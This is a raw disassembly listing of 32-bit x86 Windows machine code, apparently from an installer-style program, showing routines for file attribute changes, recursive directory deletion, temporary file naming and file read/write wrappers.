  40578e:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405791:	50                   	push   %eax
  405792:	68 07 00 00 80       	push   $0x80000007
  405797:	ff 75 08             	push   0x8(%ebp)
  40579a:	ff 15 0c 80 40 00    	call   *0x40800c
  4057a0:	85 c0                	test   %eax,%eax
  4057a2:	75 d7                	jne    0x40577b
  4057a4:	ff d6                	call   *%esi
  4057a6:	5e                   	pop    %esi
  4057a7:	c9                   	leave
  4057a8:	c2 04 00             	ret    $0x4
  4057ab:	6a 00                	push   $0x0
  4057ad:	ff 74 24 08          	push   0x8(%esp)
  4057b1:	ff 15 c4 80 40 00    	call   *0x4080c4
  4057b7:	85 c0                	test   %eax,%eax
  4057b9:	74 04                	je     0x4057bf
  4057bb:	33 c0                	xor    %eax,%eax
  4057bd:	eb 06                	jmp    0x4057c5
  4057bf:	ff 15 c0 80 40 00    	call   *0x4080c0
  4057c5:	c2 04 00             	ret    $0x4
  4057c8:	6a 05                	push   $0x5
  4057ca:	e8 0a 0d 00 00       	call   0x4064d9
  4057cf:	85 c0                	test   %eax,%eax
  4057d1:	74 0a                	je     0x4057dd
  4057d3:	ff d0                	call   *%eax
  4057d5:	85 c0                	test   %eax,%eax
  4057d7:	74 04                	je     0x4057dd
  4057d9:	33 c0                	xor    %eax,%eax
  4057db:	40                   	inc    %eax
  4057dc:	c3                   	ret
  4057dd:	33 c0                	xor    %eax,%eax
  4057df:	c3                   	ret
  4057e0:	55                   	push   %ebp
  4057e1:	8b ec                	mov    %esp,%ebp
  4057e3:	83 ec 10             	sub    $0x10,%esp
  4057e6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4057e9:	c7 05 38 25 42 00 44 	movl   $0x44,0x422538
  4057f0:	00 00 00 
  4057f3:	50                   	push   %eax
  4057f4:	33 c0                	xor    %eax,%eax
  4057f6:	68 38 25 42 00       	push   $0x422538
  4057fb:	50                   	push   %eax
  4057fc:	50                   	push   %eax
  4057fd:	68 00 00 00 04       	push   $0x4000000
  405802:	50                   	push   %eax
  405803:	50                   	push   %eax
  405804:	50                   	push   %eax
  405805:	ff 75 08             	push   0x8(%ebp)
  405808:	50                   	push   %eax
  405809:	ff 15 c8 80 40 00    	call   *0x4080c8
  40580f:	85 c0                	test   %eax,%eax
  405811:	74 0c                	je     0x40581f
  405813:	ff 75 f4             	push   -0xc(%ebp)
  405816:	ff 15 14 81 40 00    	call   *0x408114
  40581c:	8b 45 f0             	mov    -0x10(%ebp),%eax
  40581f:	c9                   	leave
  405820:	c2 04 00             	ret    $0x4
  405823:	8b 44 24 04          	mov    0x4(%esp),%eax
  405827:	50                   	push   %eax
  405828:	83 60 24 00          	andl   $0x0,0x24(%eax)
  40582c:	c7 00 3c 00 00 00    	movl   $0x3c,(%eax)
  405832:	ff 15 6c 81 40 00    	call   *0x40816c
  405838:	c2 04 00             	ret    $0x4
  40583b:	ff 25 d8 81 40 00    	jmp    *0x4081d8
  405841:	68 00 04 00 00       	push   $0x400
  405846:	ff 74 24 0c          	push   0xc(%esp)
  40584a:	ff 74 24 0c          	push   0xc(%esp)
  40584e:	ff 35 f8 3e 42 00    	push   0x423ef8
  405854:	ff 15 dc 81 40 00    	call   *0x4081dc
  40585a:	c2 08 00             	ret    $0x8
  40585d:	8b 44 24 08          	mov    0x8(%esp),%eax
  405861:	8b c8                	mov    %eax,%ecx
  405863:	81 e1 ff ff 1f 00    	and    $0x1fffff,%ecx
  405869:	83 3d e0 47 42 00 00 	cmpl   $0x0,0x4247e0
  405870:	74 05                	je     0x405877
  405872:	c1 e8 15             	shr    $0x15,%eax
  405875:	75 47                	jne    0x4058be
  405877:	83 3d e8 47 42 00 00 	cmpl   $0x0,0x4247e8
  40587e:	74 06                	je     0x405886
  405880:	81 f1 00 00 18 00    	xor    $0x180000,%ecx
  405886:	a1 28 47 42 00       	mov    0x424728,%eax
  40588b:	68 30 a2 40 00       	push   $0x40a230
  405890:	a3 34 a2 40 00       	mov    %eax,0x40a234
  405895:	a1 20 47 42 00       	mov    0x424720,%eax
  40589a:	a3 38 a2 40 00       	mov    %eax,0x40a238
  40589f:	8b 44 24 08          	mov    0x8(%esp),%eax
  4058a3:	a3 3c a2 40 00       	mov    %eax,0x40a23c
  4058a8:	c7 05 40 a2 40 00 20 	movl   $0x423f20,0x40a240
  4058af:	3f 42 00 
  4058b2:	89 0d 44 a2 40 00    	mov    %ecx,0x40a244
  4058b8:	ff 15 e0 81 40 00    	call   *0x4081e0
  4058be:	c2 08 00             	ret    $0x8
  4058c1:	56                   	push   %esi
  4058c2:	8b 74 24 08          	mov    0x8(%esp),%esi
  4058c6:	57                   	push   %edi
  4058c7:	56                   	push   %esi
  4058c8:	e8 e8 03 00 00       	call   0x405cb5
  4058cd:	8b f8                	mov    %eax,%edi
  4058cf:	83 ff ff             	cmp    $0xffffffff,%edi
  4058d2:	74 2e                	je     0x405902
  4058d4:	f6 44 24 10 01       	testb  $0x1,0x10(%esp)
  4058d9:	56                   	push   %esi
  4058da:	74 08                	je     0x4058e4
  4058dc:	ff 15 cc 80 40 00    	call   *0x4080cc
  4058e2:	eb 06                	jmp    0x4058ea
  4058e4:	ff 15 28 81 40 00    	call   *0x408128
  4058ea:	85 c0                	test   %eax,%eax
  4058ec:	74 05                	je     0x4058f3
  4058ee:	33 c0                	xor    %eax,%eax
  4058f0:	40                   	inc    %eax
  4058f1:	eb 11                	jmp    0x405904
  4058f3:	f6 44 24 10 04       	testb  $0x4,0x10(%esp)
  4058f8:	75 08                	jne    0x405902
  4058fa:	57                   	push   %edi
  4058fb:	56                   	push   %esi
  4058fc:	ff 15 b4 80 40 00    	call   *0x4080b4
  405902:	33 c0                	xor    %eax,%eax
  405904:	5f                   	pop    %edi
  405905:	5e                   	pop    %esi
  405906:	c2 08 00             	ret    $0x8
  405909:	55                   	push   %ebp
  40590a:	8b ec                	mov    %esp,%ebp
  40590c:	81 ec 4c 01 00 00    	sub    $0x14c,%esp
  405912:	53                   	push   %ebx
  405913:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  405916:	56                   	push   %esi
  405917:	57                   	push   %edi
  405918:	8b 7d 08             	mov    0x8(%ebp),%edi
  40591b:	8b c3                	mov    %ebx,%eax
  40591d:	83 e0 04             	and    $0x4,%eax
  405920:	57                   	push   %edi
  405921:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405924:	e8 9e 02 00 00       	call   0x405bc7
  405929:	f6 c3 08             	test   $0x8,%bl
  40592c:	89 45 f4             	mov    %eax,-0xc(%ebp)
  40592f:	74 17                	je     0x405948
  405931:	57                   	push   %edi
  405932:	ff 15 28 81 40 00    	call   *0x408128
  405938:	f7 d8                	neg    %eax
  40593a:	1b c0                	sbb    %eax,%eax
  40593c:	40                   	inc    %eax
  40593d:	01 05 c8 47 42 00    	add    %eax,0x4247c8
  405943:	e9 8a 01 00 00       	jmp    0x405ad2
  405948:	89 5d 08             	mov    %ebx,0x8(%ebp)
  40594b:	83 65 08 01          	andl   $0x1,0x8(%ebp)
  40594f:	74 11                	je     0x405962
  405951:	85 c0                	test   %eax,%eax
  405953:	0f 84 27 01 00 00    	je     0x405a80
  405959:	f6 c3 02             	test   $0x2,%bl
  40595c:	0f 84 1e 01 00 00    	je     0x405a80
  405962:	be 38 1d 42 00       	mov    $0x421d38,%esi
  405967:	57                   	push   %edi
  405968:	56                   	push   %esi
  405969:	e8 d3 07 00 00       	call   0x406141
  40596e:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405972:	74 0d                	je     0x405981
  405974:	68 c4 a3 40 00       	push   $0x40a3c4
  405979:	56                   	push   %esi
  40597a:	e8 de 07 00 00       	call   0x40615d
  40597f:	eb 06                	jmp    0x405987
  405981:	57                   	push   %edi
  405982:	e8 99 01 00 00       	call   0x405b20
  405987:	80 3f 00             	cmpb   $0x0,(%edi)
  40598a:	75 09                	jne    0x405995
  40598c:	80 3d 38 1d 42 00 5c 	cmpb   $0x5c,0x421d38
  405993:	75 0b                	jne    0x4059a0
  405995:	68 14 a0 40 00       	push   $0x40a014
  40599a:	57                   	push   %edi
  40599b:	e8 bd 07 00 00       	call   0x40615d
  4059a0:	57                   	push   %edi
  4059a1:	e8 b1 07 00 00       	call   0x406157
  4059a6:	8b d8                	mov    %eax,%ebx
  4059a8:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  4059ae:	50                   	push   %eax
  4059af:	56                   	push   %esi
  4059b0:	03 df                	add    %edi,%ebx
  4059b2:	ff 15 2c 81 40 00    	call   *0x40812c
  4059b8:	83 f8 ff             	cmp    $0xffffffff,%eax
  4059bb:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4059be:	0f 84 b2 00 00 00    	je     0x405a76
  4059c4:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4059ca:	6a 3f                	push   $0x3f
  4059cc:	50                   	push   %eax
  4059cd:	8d b5 e0 fe ff ff    	lea    -0x120(%ebp),%esi
  4059d3:	e8 2c 01 00 00       	call   0x405b04
  4059d8:	80 38 00             	cmpb   $0x0,(%eax)
  4059db:	74 09                	je     0x4059e6
  4059dd:	80 7d e4 00          	cmpb   $0x0,-0x1c(%ebp)
  4059e1:	74 03                	je     0x4059e6
  4059e3:	8d 75 e4             	lea    -0x1c(%ebp),%esi
  4059e6:	80 3e 2e             	cmpb   $0x2e,(%esi)
  4059e9:	75 11                	jne    0x4059fc
  4059eb:	8a 46 01             	mov    0x1(%esi),%al
  4059ee:	84 c0                	test   %al,%al
  4059f0:	74 63                	je     0x405a55
  4059f2:	3c 2e                	cmp    $0x2e,%al
  4059f4:	75 06                	jne    0x4059fc
  4059f6:	80 7e 02 00          	cmpb   $0x0,0x2(%esi)
  4059fa:	74 59                	je     0x405a55
  4059fc:	56                   	push   %esi
  4059fd:	53                   	push   %ebx
  4059fe:	e8 3e 07 00 00       	call   0x406141
  405a03:	f6 85 b4 fe ff ff 10 	testb  $0x10,-0x14c(%ebp)
  405a0a:	74 15                	je     0x405a21
  405a0c:	8b 45 0c             	mov    0xc(%ebp),%eax
  405a0f:	83 e0 03             	and    $0x3,%eax
  405a12:	3c 03                	cmp    $0x3,%al
  405a14:	75 3f                	jne    0x405a55
  405a16:	ff 75 0c             	push   0xc(%ebp)
  405a19:	57                   	push   %edi
  405a1a:	e8 ea fe ff ff       	call   0x405909
  405a1f:	eb 34                	jmp    0x405a55
  405a21:	ff 75 fc             	push   -0x4(%ebp)
  405a24:	57                   	push   %edi
  405a25:	e8 97 fe ff ff       	call   0x4058c1
  405a2a:	85 c0                	test   %eax,%eax
  405a2c:	75 1f                	jne    0x405a4d
  405a2e:	39 45 fc             	cmp    %eax,-0x4(%ebp)
  405a31:	74 12                	je     0x405a45
  405a33:	57                   	push   %edi
  405a34:	6a f1                	push   $0xfffffff1
  405a36:	e8 2d f8 ff ff       	call   0x405268
  405a3b:	6a 00                	push   $0x0
  405a3d:	57                   	push   %edi
  405a3e:	e8 dd 04 00 00       	call   0x405f20
  405a43:	eb 10                	jmp    0x405a55
  405a45:	ff 05 c8 47 42 00    	incl   0x4247c8
  405a4b:	eb 08                	jmp    0x405a55
  405a4d:	57                   	push   %edi
  405a4e:	6a f2                	push   $0xfffffff2
  405a50:	e8 13 f8 ff ff       	call   0x405268
  405a55:	8d 85 b4 fe ff ff    	lea    -0x14c(%ebp),%eax
  405a5b:	50                   	push   %eax
  405a5c:	ff 75 f8             	push   -0x8(%ebp)
  405a5f:	ff 15 30 81 40 00    	call   *0x408130
  405a65:	85 c0                	test   %eax,%eax
  405a67:	0f 85 57 ff ff ff    	jne    0x4059c4
  405a6d:	ff 75 f8             	push   -0x8(%ebp)
  405a70:	ff 15 34 81 40 00    	call   *0x408134
  405a76:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  405a7a:	74 04                	je     0x405a80
  405a7c:	80 63 ff 00          	andb   $0x0,-0x1(%ebx)
  405a80:	33 f6                	xor    %esi,%esi
  405a82:	39 75 08             	cmp    %esi,0x8(%ebp)
  405a85:	74 4b                	je     0x405ad2
  405a87:	39 75 f4             	cmp    %esi,-0xc(%ebp)
  405a8a:	75 08                	jne    0x405a94
  405a8c:	ff 05 c8 47 42 00    	incl   0x4247c8
  405a92:	eb 3e                	jmp    0x405ad2
  405a94:	57                   	push   %edi
  405a95:	e8 aa 09 00 00       	call   0x406444
  405a9a:	85 c0                	test   %eax,%eax
  405a9c:	74 34                	je     0x405ad2
  405a9e:	57                   	push   %edi
  405a9f:	e8 35 00 00 00       	call   0x405ad9
  405aa4:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405aa7:	0c 01                	or     $0x1,%al
  405aa9:	50                   	push   %eax
  405aaa:	57                   	push   %edi
  405aab:	e8 11 fe ff ff       	call   0x4058c1
  405ab0:	85 c0                	test   %eax,%eax
  405ab2:	75 16                	jne    0x405aca
  405ab4:	39 75 fc             	cmp    %esi,-0x4(%ebp)
  405ab7:	74 d3                	je     0x405a8c
  405ab9:	57                   	push   %edi
  405aba:	6a f1                	push   $0xfffffff1
  405abc:	e8 a7 f7 ff ff       	call   0x405268
  405ac1:	56                   	push   %esi
  405ac2:	57                   	push   %edi
  405ac3:	e8 58 04 00 00       	call   0x405f20
  405ac8:	eb 08                	jmp    0x405ad2
  405aca:	57                   	push   %edi
  405acb:	6a e5                	push   $0xffffffe5
  405acd:	e8 96 f7 ff ff       	call   0x405268
  405ad2:	5f                   	pop    %edi
  405ad3:	5e                   	pop    %esi
  405ad4:	5b                   	pop    %ebx
  405ad5:	c9                   	leave
  405ad6:	c2 08 00             	ret    $0x8
  405ad9:	56                   	push   %esi
  405ada:	8b 74 24 08          	mov    0x8(%esp),%esi
  405ade:	56                   	push   %esi
  405adf:	e8 73 06 00 00       	call   0x406157
  405ae4:	03 c6                	add    %esi,%eax
  405ae6:	50                   	push   %eax
  405ae7:	56                   	push   %esi
  405ae8:	ff 15 e4 81 40 00    	call   *0x4081e4
  405aee:	80 38 5c             	cmpb   $0x5c,(%eax)
  405af1:	74 0b                	je     0x405afe
  405af3:	68 14 a0 40 00       	push   $0x40a014
  405af8:	56                   	push   %esi
  405af9:	e8 5f 06 00 00       	call   0x40615d
  405afe:	8b c6                	mov    %esi,%eax
  405b00:	5e                   	pop    %esi
  405b01:	c2 04 00             	ret    $0x4
  405b04:	8b 44 24 04          	mov    0x4(%esp),%eax
  405b08:	eb 0d                	jmp    0x405b17
  405b0a:	3a 4c 24 08          	cmp    0x8(%esp),%cl
  405b0e:	74 0d                	je     0x405b1d
  405b10:	50                   	push   %eax
  405b11:	ff 15 2c 82 40 00    	call   *0x40822c
  405b17:	8a 08                	mov    (%eax),%cl
  405b19:	84 c9                	test   %cl,%cl
  405b1b:	75 ed                	jne    0x405b0a
  405b1d:	c2 08 00             	ret    $0x8
  405b20:	56                   	push   %esi
  405b21:	8b 74 24 08          	mov    0x8(%esp),%esi
  405b25:	56                   	push   %esi
  405b26:	e8 2c 06 00 00       	call   0x406157
  405b2b:	03 c6                	add    %esi,%eax
  405b2d:	80 38 5c             	cmpb   $0x5c,(%eax)
  405b30:	74 0c                	je     0x405b3e
  405b32:	50                   	push   %eax
  405b33:	56                   	push   %esi
  405b34:	ff 15 e4 81 40 00    	call   *0x4081e4
  405b3a:	3b c6                	cmp    %esi,%eax
  405b3c:	77 ef                	ja     0x405b2d
  405b3e:	80 20 00             	andb   $0x0,(%eax)
  405b41:	40                   	inc    %eax
  405b42:	5e                   	pop    %esi
  405b43:	c2 04 00             	ret    $0x4
  405b46:	8b 54 24 04          	mov    0x4(%esp),%edx
  405b4a:	8a 0a                	mov    (%edx),%cl
  405b4c:	8a c1                	mov    %cl,%al
  405b4e:	0c 20                	or     $0x20,%al
  405b50:	80 f9 5c             	cmp    $0x5c,%cl
  405b53:	75 05                	jne    0x405b5a
  405b55:	38 4a 01             	cmp    %cl,0x1(%edx)
  405b58:	74 0e                	je     0x405b68
  405b5a:	3c 61                	cmp    $0x61,%al
  405b5c:	7c 0f                	jl     0x405b6d
  405b5e:	3c 7a                	cmp    $0x7a,%al
  405b60:	7f 0b                	jg     0x405b6d
  405b62:	80 7a 01 3a          	cmpb   $0x3a,0x1(%edx)
  405b66:	75 05                	jne    0x405b6d
  405b68:	33 c0                	xor    %eax,%eax
  405b6a:	40                   	inc    %eax
  405b6b:	eb 02                	jmp    0x405b6f
  405b6d:	33 c0                	xor    %eax,%eax
  405b6f:	c2 04 00             	ret    $0x4
  405b72:	53                   	push   %ebx
  405b73:	56                   	push   %esi
  405b74:	8b 35 2c 82 40 00    	mov    0x40822c,%esi
  405b7a:	57                   	push   %edi
  405b7b:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405b7f:	57                   	push   %edi
  405b80:	ff d6                	call   *%esi
  405b82:	8b d8                	mov    %eax,%ebx
  405b84:	53                   	push   %ebx
  405b85:	ff d6                	call   *%esi
  405b87:	8a 0f                	mov    (%edi),%cl
  405b89:	84 c9                	test   %cl,%cl
  405b8b:	74 10                	je     0x405b9d
  405b8d:	80 3b 3a             	cmpb   $0x3a,(%ebx)
  405b90:	75 0b                	jne    0x405b9d
  405b92:	80 7b 01 5c          	cmpb   $0x5c,0x1(%ebx)
  405b96:	75 05                	jne    0x405b9d
  405b98:	50                   	push   %eax
  405b99:	ff d6                	call   *%esi
  405b9b:	eb 24                	jmp    0x405bc1
  405b9d:	80 f9 5c             	cmp    $0x5c,%cl
  405ba0:	75 1d                	jne    0x405bbf
  405ba2:	38 4f 01             	cmp    %cl,0x1(%edi)
  405ba5:	75 18                	jne    0x405bbf
  405ba7:	6a 02                	push   $0x2
  405ba9:	5e                   	pop    %esi
  405baa:	6a 5c                	push   $0x5c
  405bac:	50                   	push   %eax
  405bad:	4e                   	dec    %esi
  405bae:	e8 51 ff ff ff       	call   0x405b04
  405bb3:	80 38 00             	cmpb   $0x0,(%eax)
  405bb6:	74 07                	je     0x405bbf
  405bb8:	40                   	inc    %eax
  405bb9:	85 f6                	test   %esi,%esi
  405bbb:	75 ed                	jne    0x405baa
  405bbd:	eb 02                	jmp    0x405bc1
  405bbf:	33 c0                	xor    %eax,%eax
  405bc1:	5f                   	pop    %edi
  405bc2:	5e                   	pop    %esi
  405bc3:	5b                   	pop    %ebx
  405bc4:	c2 04 00             	ret    $0x4
  405bc7:	56                   	push   %esi
  405bc8:	57                   	push   %edi
  405bc9:	ff 74 24 0c          	push   0xc(%esp)
  405bcd:	be 38 21 42 00       	mov    $0x422138,%esi
  405bd2:	56                   	push   %esi
  405bd3:	e8 69 05 00 00       	call   0x406141
  405bd8:	56                   	push   %esi
  405bd9:	e8 94 ff ff ff       	call   0x405b72
  405bde:	8b f8                	mov    %eax,%edi
  405be0:	85 ff                	test   %edi,%edi
  405be2:	75 04                	jne    0x405be8
  405be4:	33 c0                	xor    %eax,%eax
  405be6:	eb 52                	jmp    0x405c3a
  405be8:	57                   	push   %edi
  405be9:	e8 bd 07 00 00       	call   0x4063ab
  405bee:	f6 05 3c 47 42 00 80 	testb  $0x80,0x42473c
  405bf5:	74 0a                	je     0x405c01
  405bf7:	8a 07                	mov    (%edi),%al
  405bf9:	84 c0                	test   %al,%al
  405bfb:	74 e7                	je     0x405be4
  405bfd:	3c 5c                	cmp    $0x5c,%al
  405bff:	74 e3                	je     0x405be4
  405c01:	2b fe                	sub    %esi,%edi
  405c03:	eb 14                	jmp    0x405c19
  405c05:	e8 3a 08 00 00       	call   0x406444
  405c0a:	85 c0                	test   %eax,%eax
  405c0c:	74 05                	je     0x405c13
  405c0e:	f6 00 10             	testb  $0x10,(%eax)
  405c11:	74 d1                	je     0x405be4
  405c13:	56                   	push   %esi
  405c14:	e8 07 ff ff ff       	call   0x405b20
  405c19:	56                   	push   %esi
  405c1a:	e8 38 05 00 00       	call   0x406157
  405c1f:	3b c7                	cmp    %edi,%eax
  405c21:	56                   	push   %esi
  405c22:	7f e1                	jg     0x405c05
  405c24:	e8 b0 fe ff ff       	call   0x405ad9
  405c29:	56                   	push   %esi
  405c2a:	ff 15 fc 80 40 00    	call   *0x4080fc
  405c30:	33 c9                	xor    %ecx,%ecx
  405c32:	83 f8 ff             	cmp    $0xffffffff,%eax
  405c35:	0f 95 c1             	setne  %cl
  405c38:	8b c1                	mov    %ecx,%eax
  405c3a:	5f                   	pop    %edi
  405c3b:	5e                   	pop    %esi
  405c3c:	c2 04 00             	ret    $0x4
  405c3f:	55                   	push   %ebp
  405c40:	8b ec                	mov    %esp,%ebp
  405c42:	51                   	push   %ecx
  405c43:	53                   	push   %ebx
  405c44:	56                   	push   %esi
  405c45:	57                   	push   %edi
  405c46:	8b 3d a0 80 40 00    	mov    0x4080a0,%edi
  405c4c:	ff 75 0c             	push   0xc(%ebp)
  405c4f:	ff d7                	call   *%edi
  405c51:	8b 75 08             	mov    0x8(%ebp),%esi
  405c54:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405c57:	eb 27                	jmp    0x405c80
  405c59:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405c5c:	ff 75 0c             	push   0xc(%ebp)
  405c5f:	8a 1c 30             	mov    (%eax,%esi,1),%bl
  405c62:	80 24 30 00          	andb   $0x0,(%eax,%esi,1)
  405c66:	56                   	push   %esi
  405c67:	ff 15 18 81 40 00    	call   *0x408118
  405c6d:	85 c0                	test   %eax,%eax
  405c6f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405c72:	88 1c 30             	mov    %bl,(%eax,%esi,1)
  405c75:	74 1a                	je     0x405c91
  405c77:	56                   	push   %esi
  405c78:	ff 15 2c 82 40 00    	call   *0x40822c
  405c7e:	8b f0                	mov    %eax,%esi
  405c80:	56                   	push   %esi
  405c81:	ff d7                	call   *%edi
  405c83:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  405c86:	7d d1                	jge    0x405c59
  405c88:	33 c0                	xor    %eax,%eax
  405c8a:	5f                   	pop    %edi
  405c8b:	5e                   	pop    %esi
  405c8c:	5b                   	pop    %ebx
  405c8d:	c9                   	leave
  405c8e:	c2 08 00             	ret    $0x8
  405c91:	8b c6                	mov    %esi,%eax
  405c93:	eb f5                	jmp    0x405c8a
  405c95:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  405c99:	56                   	push   %esi
  405c9a:	8b 74 24 10          	mov    0x10(%esp),%esi
  405c9e:	85 f6                	test   %esi,%esi
  405ca0:	76 0f                	jbe    0x405cb1
  405ca2:	8b 44 24 0c          	mov    0xc(%esp),%eax
  405ca6:	2b c1                	sub    %ecx,%eax
  405ca8:	8a 14 08             	mov    (%eax,%ecx,1),%dl
  405cab:	88 11                	mov    %dl,(%ecx)
  405cad:	41                   	inc    %ecx
  405cae:	4e                   	dec    %esi
  405caf:	75 f7                	jne    0x405ca8
  405cb1:	5e                   	pop    %esi
  405cb2:	c2 0c 00             	ret    $0xc
  405cb5:	56                   	push   %esi
  405cb6:	ff 74 24 08          	push   0x8(%esp)
  405cba:	ff 15 fc 80 40 00    	call   *0x4080fc
  405cc0:	8b f0                	mov    %eax,%esi
  405cc2:	83 fe ff             	cmp    $0xffffffff,%esi
  405cc5:	74 0d                	je     0x405cd4
  405cc7:	24 fe                	and    $0xfe,%al
  405cc9:	50                   	push   %eax
  405cca:	ff 74 24 0c          	push   0xc(%esp)
  405cce:	ff 15 b4 80 40 00    	call   *0x4080b4
  405cd4:	8b c6                	mov    %esi,%eax
  405cd6:	5e                   	pop    %esi
  405cd7:	c2 04 00             	ret    $0x4
  405cda:	ff 74 24 04          	push   0x4(%esp)
  405cde:	ff 15 fc 80 40 00    	call   *0x4080fc
  405ce4:	8b c8                	mov    %eax,%ecx
  405ce6:	6a 00                	push   $0x0
  405ce8:	41                   	inc    %ecx
  405ce9:	f7 d9                	neg    %ecx
  405ceb:	1b c9                	sbb    %ecx,%ecx
  405ced:	23 c8                	and    %eax,%ecx
  405cef:	51                   	push   %ecx
  405cf0:	ff 74 24 14          	push   0x14(%esp)
  405cf4:	6a 00                	push   $0x0
  405cf6:	6a 01                	push   $0x1
  405cf8:	ff 74 24 1c          	push   0x1c(%esp)
  405cfc:	ff 74 24 1c          	push   0x1c(%esp)
  405d00:	ff 15 74 80 40 00    	call   *0x408074
  405d06:	c2 0c 00             	ret    $0xc
  405d09:	55                   	push   %ebp
  405d0a:	8b ec                	mov    %esp,%ebp
  405d0c:	56                   	push   %esi
  405d0d:	8b 75 08             	mov    0x8(%ebp),%esi
  405d10:	57                   	push   %edi
  405d11:	6a 64                	push   $0x64
  405d13:	5f                   	pop    %edi
  405d14:	a1 cc a3 40 00       	mov    0x40a3cc,%eax
  405d19:	4f                   	dec    %edi
  405d1a:	89 45 08             	mov    %eax,0x8(%ebp)
  405d1d:	ff 15 90 80 40 00    	call   *0x408090
  405d23:	6a 1a                	push   $0x1a
  405d25:	33 d2                	xor    %edx,%edx
  405d27:	59                   	pop    %ecx
  405d28:	f7 f1                	div    %ecx
  405d2a:	56                   	push   %esi
  405d2b:	8d 45 08             	lea    0x8(%ebp),%eax
  405d2e:	6a 00                	push   $0x0
  405d30:	50                   	push   %eax
  405d31:	ff 75 0c             	push   0xc(%ebp)
  405d34:	00 55 0a             	add    %dl,0xa(%ebp)
  405d37:	ff 15 d0 80 40 00    	call   *0x4080d0
  405d3d:	85 c0                	test   %eax,%eax
  405d3f:	75 0d                	jne    0x405d4e
  405d41:	85 ff                	test   %edi,%edi
  405d43:	75 cf                	jne    0x405d14
  405d45:	80 26 00             	andb   $0x0,(%esi)
  405d48:	5f                   	pop    %edi
  405d49:	5e                   	pop    %esi
  405d4a:	5d                   	pop    %ebp
  405d4b:	c2 08 00             	ret    $0x8
  405d4e:	8b c6                	mov    %esi,%eax
  405d50:	eb f6                	jmp    0x405d48
  405d52:	55                   	push   %ebp
  405d53:	8b ec                	mov    %esp,%ebp
  405d55:	56                   	push   %esi
  405d56:	8b 75 10             	mov    0x10(%ebp),%esi
  405d59:	8d 45 10             	lea    0x10(%ebp),%eax
  405d5c:	6a 00                	push   $0x0
  405d5e:	50                   	push   %eax
  405d5f:	56                   	push   %esi
  405d60:	ff 75 0c             	push   0xc(%ebp)
  405d63:	ff 75 08             	push   0x8(%ebp)
  405d66:	ff 15 80 80 40 00    	call   *0x408080
  405d6c:	85 c0                	test   %eax,%eax
  405d6e:	74 0a                	je     0x405d7a
  405d70:	3b 75 10             	cmp    0x10(%ebp),%esi
  405d73:	75 05                	jne    0x405d7a
  405d75:	33 c0                	xor    %eax,%eax
  405d77:	40                   	inc    %eax
  405d78:	eb 02                	jmp    0x405d7c
  405d7a:	33 c0                	xor    %eax,%eax
  405d7c:	5e                   	pop    %esi
  405d7d:	5d                   	pop    %ebp
  405d7e:	c2 0c 00             	ret    $0xc
  405d81:	55                   	push   %ebp
  405d82:	8b ec                	mov    %esp,%ebp
  405d84:	56                   	push   %esi
  405d85:	8b 75 10             	mov    0x10(%ebp),%esi
  405d88:	8d 45 10             	lea    0x10(%ebp),%eax
  405d8b:	6a 00                	push   $0x0
  405d8d:	50                   	push   %eax
  405d8e:	56                   	push   %esi
  405d8f:	ff 75 0c             	push   0xc(%ebp)
  405d92:	ff 75 08             	push   0x8(%ebp)
  405d95:	ff 15 d4 80 40 00    	call   *0x4080d4
  405d9b:	85 c0                	test   %eax,%eax
  405d9d:	74 0a                	je     0x405da9
  405d9f:	3b 75 10             	cmp    0x10(%ebp),%esi
  405da2:	75 05                	jne    0x405da9
  405da4:	33 c0                	xor    %eax,%eax
  405da6:	40                   	inc    %eax
  405da7:	eb 02                	jmp    0x405dab
  405da9:	33 c0                	xor    %eax,%eax
  405dab:	5e                   	pop    %esi
  405dac:	5d                   	pop    %ebp
  405dad:	c2 0c 00             	ret    $0xc
  405db0:	53                   	push   %ebx
  405db1:	8b 1d 0c 81 40 00    	mov    0x40810c,%ebx
  405db7:	55                   	push   %ebp
  405db8:	56                   	push   %esi
  405db9:	8b 74 24 14          	mov    0x14(%esp),%esi
  405dbd:	57                   	push   %edi
  405dbe:	85 f6                	test   %esi,%esi
  405dc0:	c7 05 c0 2a 42 00 4e 	movl   $0x4c554e,0x422ac0
  405dc7:	55 4c 00 
  405dca:	bf 00 04 00 00       	mov    $0x400,%edi
  405dcf:	bd c0 2a 42 00       	mov    $0x422ac0,%ebp
  405dd4:	74 26                	je     0x405dfc
  405dd6:	6a 01                	push   $0x1
  405dd8:	6a 00                	push   $0x0
  405dda:	56                   	push   %esi
  405ddb:	e8 fa fe ff ff       	call   0x405cda
  405de0:	50                   	push   %eax
  405de1:	ff 15 14 81 40 00    	call   *0x408114
  405de7:	57                   	push   %edi
  405de8:	55                   	push   %ebp
  405de9:	56                   	push   %esi
  405dea:	ff d3                	call   *%ebx
  405dec:	85 c0                	test   %eax,%eax
  405dee:	0f 84 27 01 00 00    	je     0x405f1b
  405df4:	3b c7                	cmp    %edi,%eax
  405df6:	0f 8f 1f 01 00 00    	jg     0x405f1b
  405dfc:	be c0 2e 42 00       	mov    $0x422ec0,%esi
  405e01:	57                   	push   %edi
  405e02:	56                   	push   %esi
  405e03:	ff 74 24 1c          	push   0x1c(%esp)
  405e07:	ff d3                	call   *%ebx
  405e09:	85 c0                	test   %eax,%eax
  405e0b:	0f 84 0a 01 00 00    	je     0x405f1b
  405e11:	3b c7                	cmp    %edi,%eax
  405e13:	0f 8f 02 01 00 00    	jg     0x405f1b
  405e19:	56                   	push   %esi
  405e1a:	55                   	push   %ebp
  405e1b:	68 e0 a3 40 00       	push   $0x40a3e0
  405e20:	68 c0 26 42 00       	push   $0x4226c0
  405e25:	ff 15 74 82 40 00    	call   *0x408274
  405e2b:	8b d8                	mov    %eax,%ebx
  405e2d:	a1 34 47 42 00       	mov    0x424734,%eax
  405e32:	83 c4 10             	add    $0x10,%esp
